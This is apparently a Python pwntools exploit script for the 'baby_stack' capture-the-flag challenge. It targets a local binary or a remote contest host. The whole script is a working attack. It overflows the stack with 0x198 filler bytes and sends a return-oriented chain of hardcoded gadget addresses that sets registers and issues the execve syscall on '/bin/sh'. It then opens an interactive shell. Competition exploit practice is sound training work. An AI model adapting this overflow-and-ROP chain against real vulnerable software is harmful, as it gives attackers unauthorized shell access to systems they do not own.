#!/usr/bin/python

from pwn import *
from pwnlib import *

if __name__ == '__main__':

    if args.args['REMOTE']:
        r = remote('baby_stack.pwn.seccon.jp', 15285)
    else:
        r = process('./baby_stack')
  
    add_rdi_40 = 0x0000000000455e8c 
    push_rsp = 0x0000000000456b3b
    pop_rdi = 0x000000000042274f
    pop_rsi = 0x000000000046defd
    pop_rdx = 0x000000000046ec93
    pop_rax = 0x00000000004016ea
    syscall = 0x0000000000456889

    r.recvuntil('Please tell me your name >> ')
    r.send('/bin/sh\x00\n')
    
    r.recvuntil('Give me your message >> ')

    payload = ""
    payload += p64(pop_rax)
    payload += p64(0x5a0005)
    
    for i in range(16):
        payload += p64(add_rdi_40)
    
    payload += p64(pop_rsi)
    payload += p64(0)
    payload += p64(pop_rdx)
    payload += p64(0)
    payload += p64(pop_rax)
    payload += p64(59)
    payload += p64(syscall)
    payload += '\x00'*0x28
    payload += '/bin/sh\x00'
   
    #raw_input('#')
    r.send('\x00'*0x198 + payload )
    r.interactive()
